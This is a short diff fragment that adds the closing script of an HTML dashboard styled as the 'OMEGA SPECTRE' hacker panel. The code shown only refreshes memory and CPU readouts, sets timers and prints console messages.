+                    document.getElementById('memoryUsage').textContent = data.memory_usage + '%';
+                }
+                if (data.cpu_usage) {
+                    document.getElementById('cpuUsage').textContent = data.cpu_usage + '%';
+                }
+            } catch (e) {}
+        }
+
+        // ============================================================
+        //  INIT
+        // ============================================================
+        renderModules();
+        updateUptime();
+        setInterval(updateUptime, 1000);
+        setInterval(refreshStatus, 5000);
+        refreshStatus();
+        addLog('🔥 OMEGA SPECTRE — System activated', 'success');
+
+        console.log('☠️ OMEGA SPECTRE — Glass Hacker Panel Loaded');
+        console.log(`📦 Modules: ${modules.length}`);
+        console.log('🔥 All files under your control');
+    </script>
 
 </body>
 </html>
